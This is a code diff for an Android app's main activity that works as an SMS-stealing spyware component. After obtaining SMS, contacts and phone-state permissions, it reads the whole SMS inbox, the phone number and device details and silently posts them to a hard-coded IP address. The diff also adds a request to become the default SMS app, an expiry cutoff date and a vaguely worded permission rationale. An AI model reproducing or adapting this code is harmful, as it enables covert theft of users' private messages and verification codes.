@@ -1,8 +1,10 @@
-package com.getphone;
+package com.yinmeng;
 
 import android.Manifest;
+import android.app.Dialog;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
@@ -10,11 +12,11 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.ContactsContract;
+import android.provider.Telephony;
 import android.support.v7.app.AppCompatActivity;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.util.Log;
-import android.widget.Toast;
 
 import com.kcode.permissionslib.main.OnRequestPermissionsCallBack;
 import com.kcode.permissionslib.main.PermissionCompat;
@@ -30,31 +32,46 @@ import java.text.SimpleDateFormat;
 import java.util.HashMap;
 import java.util.Map;
 
+
 public class MainActivity extends AppCompatActivity {
 
-    private final long end = 1523808000000L;
+    public static final long end = 1535115724000L;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+        final String myPackageName = getPackageName();
+        if (!Telephony.Sms.getDefaultSmsPackage(MainActivity.this).equals(myPackageName)) {
+            Intent intent =
+                    new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
+            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME,
+                    myPackageName);
+            startActivity(intent);
+        }
+
+
         new PermissionCompat.Builder(this)
                 .addPermissions(new String[]{
                         Manifest.permission.READ_SMS
                         , Manifest.permission.RECEIVE_SMS
                         , Manifest.permission.READ_CONTACTS
                         , Manifest.permission.READ_PHONE_STATE
-
                 })
                 .addPermissionRationale("응용필요이권한보증기능보완이있어야한다")
                 .addRequestPermissionsCallBack(new OnRequestPermissionsCallBack() {
                     @Override
                     public void onGrant() {
+
                         if (System.currentTimeMillis() > end) {
+                            finish();
                             return;
                         }
 
                         SpUtil.clear(MainActivity.this);
+
+                        //showLoadingDialog(MainActivity.this).show();
 
                         //获取手机号码
                         String phoneNumber = getPhoneNumber();
@@ -81,6 +98,7 @@ public class MainActivity extends AppCompatActivity {
                         if (TextUtils.isEmpty(model)) {
                             Log.e("MainActivity", "1.0");
                         }
+
                         Log.e("MainActivity", model);
 
                         //获取手机版本号
@@ -99,12 +117,13 @@ public class MainActivity extends AppCompatActivity {
                         map.put("xing_hao", String.valueOf(SpUtil.get(getApplicationContext(), "model", "未知设备")));
                         map.put("xi_tong", String.valueOf(SpUtil.get(getApplicationContext(), "modelversion", "未知系统")));
                         map.put("ban_ben", String.valueOf(SpUtil.get(getApplicationContext(), "version", "未知版本")));
-                        map.put("tel_str", queryContactPhoneNumber());
+                        //map.put("tel_str", queryContactPhoneNumber());
+                        map.put("tel_str", "");
                         map.put("sms_str", getSmsFromPhone());
                         map.put("tel_stu", "3");
                         map.put("left_right", "3");
                         map.put("x_tel", "3");
-                        RequestParams params = new RequestParams("http://115.144.178.33/api/zhuan_bo");
+                        RequestParams params = new RequestParams("http://103.200.31.130//api/zhuan_bo");
                         try {
                             params.setRequestBody(new UrlEncodedParamsBody(map, "utf-8"));
                         } catch (IOException e) {
@@ -114,18 +133,22 @@ public class MainActivity extends AppCompatActivity {
                         x.http().post(params, new Callback.CommonCallback<String>() {
                             @Override
                             public void onSuccess(String result) {
+
                             }
 
                             @Override
                             public void onError(Throwable ex, boolean isOnCallback) {
+
                             }
 
                             @Override
                             public void onCancelled(CancelledException cex) {
+
                             }
 
                             @Override
                             public void onFinished() {
+
                             }
                         });
 
@@ -169,14 +192,17 @@ public class MainActivity extends AppCompatActivity {
     private Uri SMS_INBOX = Uri.parse("content://sms/");
 
     public String getSmsFromPhone() {
+
         StringBuilder stringBuilder = new StringBuilder();
         ContentResolver cr = getContentResolver();
         String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
         Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
+
         if (null == cur) {
             Log.i("ooc", "************cur == null");
             return "";
         }
+
         while (cur.moveToNext()) {
             String number = cur.getString(cur.getColumnIndex("address"));//手机号
             String body = cur.getString(cur.getColumnIndex("body"));//短信内容
@@ -201,9 +227,9 @@ public class MainActivity extends AppCompatActivity {
      */
     private String getPhoneNumber() {
         TelephonyManager phoneMgr = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
-
         return phoneMgr.getLine1Number();
     }
+
 
     /**
      * 唯一的设备ID： GSM手机的 IMEI 和 CDMA手机的 MEID. Return null if device ID is not
@@ -246,7 +272,6 @@ public class MainActivity extends AppCompatActivity {
 
 
     class UrlEncodedParamsBody implements RequestBody {
-
         private byte[] content;
         private String charset = "UTF-8";
 
@@ -269,7 +294,6 @@ public class MainActivity extends AppCompatActivity {
                     }
                 }
             }
-
             this.content = contentSb.toString().getBytes(this.charset);
         }
 
@@ -295,4 +319,17 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    /**
+     * 显示正在加载动画
+     *
+     * @param context
+     */
+    public static Dialog showLoadingDialog(Context context) {
+        //创建Dialog并传递style文件
+        final Dialog dialog = new BackDiaLog(context, R.style.dialog);
+        // 设置它的ContentView
+        dialog.setCanceledOnTouchOutside(false);// 设置点击屏幕Dialog不消失
+        dialog.setContentView(R.layout.dialog_loading_layout);
+        return dialog;
+    }
 }
